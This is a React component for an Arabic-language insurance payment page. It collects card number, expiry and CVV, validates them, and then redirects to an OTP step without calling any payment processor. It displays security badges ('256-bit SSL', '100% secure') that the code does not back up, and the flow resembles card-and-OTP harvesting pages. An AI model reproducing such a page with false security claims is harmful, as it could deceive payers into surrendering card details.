import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CreditCard, Lock, ArrowRight } from "lucide-react";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { useToast } from "@/hooks/use-toast";
const Payment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const {
    toast
  } = useToast();
  const companyName = searchParams.get("company") || "شركة التأمين";
  const price = searchParams.get("price") || "0";
  const regularPrice = searchParams.get("regularPrice") || price;

  // حساب الخصم
  const calculateDiscount = () => {
    const regular = parseFloat(regularPrice.replace(/,/g, ""));
    const sale = parseFloat(price.replace(/,/g, ""));
    return (regular - sale).toFixed(2);
  };
  const discount = calculateDiscount();
  const [formData, setFormData] = useState({
    cardholderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: ""
  });

  // تحديد نوع البطاقة بناءً على الأرقام
  const getCardType = (cardNumber: string): "visa" | "mastercard" | "unknown" => {
    const digits = cardNumber.replace(/\s/g, "");

    // فيزا تبدأ بـ 4
    if (digits.startsWith("4")) {
      return "visa";
    }

    // ماستركارد تبدأ من 51-55 أو 2221-2720
    const firstTwo = parseInt(digits.substring(0, 2));
    const firstFour = parseInt(digits.substring(0, 4));
    if (firstTwo >= 51 && firstTwo <= 55 || firstFour >= 2221 && firstFour <= 2720) {
      return "mastercard";
    }
    return "unknown";
  };
  const cardType = getCardType(formData.cardNumber);
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const {
      name,
      value
    } = e.target;
    let filteredValue = value;

    // تنسيق رقم البطاقة
    if (name === "cardNumber") {
      filteredValue = value.replace(/\D/g, "").slice(0, 16);
      // إضافة مسافات كل 4 أرقام
      filteredValue = filteredValue.replace(/(\d{4})/g, "$1 ").trim();
    }

    // CVV - أرقام فقط، بحد أقصى 4
    if (name === "cvv") {
      filteredValue = value.replace(/\D/g, "").slice(0, 4);
    }

    // شهر الانتهاء - رقمين فقط
    if (name === "expiryMonth") {
      filteredValue = value.replace(/\D/g, "").slice(0, 2);
      // التأكد من أن القيمة بين 01 و 12
      if (filteredValue && parseInt(filteredValue) > 12) {
        filteredValue = "12";
      }
    }

    // سنة الانتهاء - رقمين فقط
    if (name === "expiryYear") {
      filteredValue = value.replace(/\D/g, "").slice(0, 2);
    }
    setFormData(prev => ({
      ...prev,
      [name]: filteredValue
    }));
  };
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // التحقق من الحقول
    if (!formData.cardholderName.trim()) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم حامل البطاقة",
        variant: "destructive"
      });
      return;
    }
    if (formData.cardNumber.replace(/\s/g, "").length !== 16) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم بطاقة صحيح (16 رقم)",
        variant: "destructive"
      });
      return;
    }
    if (!formData.expiryMonth || !formData.expiryYear) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال تاريخ انتهاء البطاقة",
        variant: "destructive"
      });
      return;
    }
    if (formData.cvv.length < 3) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز CVV صحيح",
        variant: "destructive"
      });
      return;
    }

    // التوجيه إلى صفحة التحقق OTP
    toast({
      title: "جاري معالجة الدفع",
      description: "سيتم إرسال رمز التحقق إلى رقم هاتفك",
    });

    setTimeout(() => {
      navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}`);
    }, 1500);
  };
  return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20">
      <section className="pt-8 pb-16 px-4 md:px-6">
        <div className="container mx-auto max-w-6xl">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="inline-flex items-center justify-center gap-2 bg-emerald-500/10 text-emerald-600 px-4 py-2 rounded-full mb-4">
              <Lock className="h-4 w-4" />
              <span className="text-sm font-medium">دفع آمن ومشفر SSL 256-bit</span>
            </div>
            <h1 className="text-4xl md:text-5xl font-bold mb-2 bg-gradient-to-l from-primary via-purple-600 to-primary bg-clip-text text-transparent">
              إتمام عملية الدفع
            </h1>
            <p className="text-muted-foreground">أدخل معلومات البطاقة لإتمام الطلب</p>
          </div>

          <div className="grid lg:grid-cols-2 gap-8 items-start">
            {/* بطاقة الائتمان التفاعلية */}
            <div className="space-y-6">
              <div className="relative">
                {/* البطاقة الأمامية */}
                <div className="relative w-full aspect-[1.586/1] rounded-2xl p-6 md:p-8 shadow-2xl transition-all duration-300 hover:scale-105" style={{
                background: cardType === "visa" ? "linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%)" : cardType === "mastercard" ? "linear-gradient(135deg, #991b1b 0%, #dc2626 100%)" : "linear-gradient(135deg, #1e293b 0%, #334155 100%)"
              }}>
                  {/* رقائق البطاقة */}
                  <div className="absolute top-6 left-6 w-12 h-10 md:w-14 md:h-12 bg-gradient-to-br from-yellow-200 to-yellow-400 rounded-md opacity-80"></div>
                  
                  {/* شعار نوع البطاقة */}
                  <div className="absolute top-6 right-6">
                    {cardType === "visa" ? <div className="bg-white px-3 py-1 rounded text-blue-600 font-black text-xl md:text-2xl">
                        VISA
                      </div> : cardType === "mastercard" ? <div className="flex items-center">
                        <div className="w-8 h-8 md:w-10 md:h-10 rounded-full bg-red-500" />
                        <div className="w-8 h-8 md:w-10 md:h-10 rounded-full bg-yellow-500 -ml-4" />
                      </div> : <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center">
                        <CreditCard className="h-6 w-6 text-white" />
                      </div>}
                  </div>

                  {/* رقم البطاقة */}
                  <div className="absolute bottom-20 md:bottom-24 left-6 right-6">
                    <p className="text-white font-mono text-lg md:text-2xl tracking-wider text-center" dir="ltr">
                      {formData.cardNumber || "•••• •••• •••• ••••"}
                    </p>
                  </div>

                  {/* اسم حامل البطاقة وتاريخ الانتهاء */}
                  <div className="absolute bottom-6 left-6 right-6 flex justify-between items-end">
                    <div>
                      <p className="text-white/60 text-xs mb-1">CARDHOLDER NAME</p>
                      <p className="text-white font-semibold text-sm md:text-base uppercase">
                        {formData.cardholderName || "YOUR NAME"}
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-white/60 text-xs mb-1">VALID THRU</p>
                      <p className="text-white font-mono text-sm md:text-base" dir="ltr">
                        {formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "MM/YY"}
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* ملخص الطلب */}
              <Card className="p-6 shadow-lg border-2">
                <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                  ملخص الطلب
                </h3>
                <div className="space-y-3">
                  <div className="flex justify-between items-start">
                    <span className="text-sm text-muted-foreground">الشركة:</span>
                    <span className="font-medium text-sm text-right max-w-xs">{companyName}</span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-t">
                    <span className="text-sm text-muted-foreground">السعر الأصلي:</span>
                    <span className="text-sm line-through text-muted-foreground">{regularPrice} ﷼</span>
                  </div>
                  {parseFloat(discount) > 0 && <div className="flex justify-between items-center bg-emerald-50 dark:bg-emerald-950/30 p-3 rounded-lg">
                      <span className="text-sm text-emerald-700 dark:text-emerald-400 font-semibold">🎉 الخصم</span>
                      <span className="text-lg text-emerald-700 dark:text-emerald-400 font-bold">- {discount} ﷼</span>
                    </div>}
                  <div className="flex justify-between items-center pt-4 border-t-2">
                    <span className="text-xl font-bold">المبلغ الإجمالي:</span>
                    <span className="text-3xl font-black text-primary">{price} ﷼</span>
                  </div>
                </div>

                {/* شعارات الأمان */}
                <div className="mt-6 pt-6 border-t">
                  <div className="flex items-center justify-center gap-4 text-xs text-muted-foreground">
                    <div className="flex items-center gap-1">
                      <Lock className="h-3 w-3" />
                      <span>مشفر</span>
                    </div>
                    <span>•</span>
                    <div className="flex items-center gap-1">
                      <span>✓</span>
                      <span>آمن 100%</span>
                    </div>
                    <span>•</span>
                    <div className="flex items-center gap-1">
                      <span>🛡️</span>
                      <span>SSL</span>
                    </div>
                  </div>
                </div>
              </Card>
            </div>

            {/* نموذج الدفع */}
            <Card className="p-8 shadow-xl border-2">
              <h2 className="text-2xl font-bold mb-6">معلومات الدفع</h2>
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* اسم حامل البطاقة */}
                <div className="space-y-2">
                  <Label htmlFor="cardholderName" className="text-base">
                    اسم حامل البطاقة <span className="text-destructive">*</span>
                  </Label>
                  <Input id="cardholderName" name="cardholderName" placeholder="الاسم كما هو مكتوب على البطاقة" value={formData.cardholderName} onChange={handleInputChange} required className="text-right h-12 text-base" />
                </div>

                {/* رقم البطاقة */}
                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="text-base">
                    رقم البطاقة <span className="text-destructive">*</span>
                  </Label>
                  <div className="relative">
                    <Input id="cardNumber" name="cardNumber" type="text" inputMode="numeric" placeholder="1234 5678 9012 3456" value={formData.cardNumber} onChange={handleInputChange} required className="pr-16 h-12 text-base font-mono" dir="ltr" />
                    <div className="absolute left-3 top-1/2 -translate-y-1/2">
                      {cardType === "visa" ? <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold">
                          VISA
                        </div> : cardType === "mastercard" ? <div className="flex items-center">
                          <div className="w-5 h-5 rounded-full bg-red-500" />
                          <div className="w-5 h-5 rounded-full bg-yellow-500 -ml-2.5" />
                        </div> : <CreditCard className="h-5 w-5 text-muted-foreground" />}
                    </div>
                  </div>
                </div>

                {/* تاريخ الانتهاء و CVV */}
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label className="text-base">
                      تاريخ الانتهاء <span className="text-destructive">*</span>
                    </Label>
                    <div className="flex gap-2">
                      <Input name="expiryMonth" type="text" inputMode="numeric" placeholder="MM" value={formData.expiryMonth} onChange={handleInputChange} maxLength={2} required className="text-center h-12 text-base font-mono" dir="ltr" />
                      <span className="flex items-center text-xl font-bold">/</span>
                      <Input name="expiryYear" type="text" inputMode="numeric" placeholder="YY" value={formData.expiryYear} onChange={handleInputChange} maxLength={2} required className="text-center h-12 text-base font-mono" dir="ltr" />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-base flex items-center gap-2">
                      رمز الأمان (CVV) <span className="text-destructive">*</span>
                      <span className="text-xs text-muted-foreground">(خلف البطاقة)</span>
                    </Label>
                    <Input id="cvv" name="cvv" type="text" inputMode="numeric" placeholder="123" value={formData.cvv} onChange={handleInputChange} maxLength={4} required className="text-center h-12 text-base font-mono" dir="ltr" />
                  </div>
                </div>

                {/* أزرار التحكم */}
                <div className="flex gap-4 pt-6">
                  
                  <Button type="submit" size="lg" className="flex-1 h-12 bg-gradient-to-l from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/30">
                    <Lock className="ml-2 h-5 w-5" />
                    ادفع {price} ﷼ بأمان
                  </Button>
                </div>

                {/* ملاحظة الخصوصية */}
                <div className="text-center pt-6 border-t">
                  <p className="text-xs text-muted-foreground">
                    بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                  </p>
                </div>
              </form>
            </Card>
          </div>

          {/* شعارات البطاقات المقبولة */}
          <div className="mt-12 text-center">
            <p className="text-sm text-muted-foreground mb-6">وسائل الدفع المقبولة</p>
            <div className="flex flex-wrap justify-center gap-6 items-center">
              <div className="bg-card border rounded-lg px-4 py-2 shadow-sm hover:shadow-md transition-shadow">
                <div className="bg-blue-600 text-white px-3 py-1 rounded font-black text-lg">VISA</div>
              </div>
              <div className="bg-card border rounded-lg px-4 py-2 shadow-sm hover:shadow-md transition-shadow">
                <div className="flex items-center gap-1">
                  <div className="w-7 h-7 rounded-full bg-red-500"></div>
                  <div className="w-7 h-7 rounded-full bg-yellow-500 -ml-3"></div>
                </div>
              </div>
              <div className="bg-card border rounded-lg px-4 py-2 shadow-sm hover:shadow-md transition-shadow">
                <span className="font-bold text-blue-600">American Express</span>
              </div>
              <div className="bg-card border rounded-lg px-4 py-2 shadow-sm hover:shadow-md transition-shadow">
                <span className="font-bold text-orange-600">Discover</span>
              </div>
              <div className="bg-card border rounded-lg px-4 py-2 shadow-sm hover:shadow-md transition-shadow">
                <span className="font-bold">مدى</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />
    </div>;
};
export default Payment;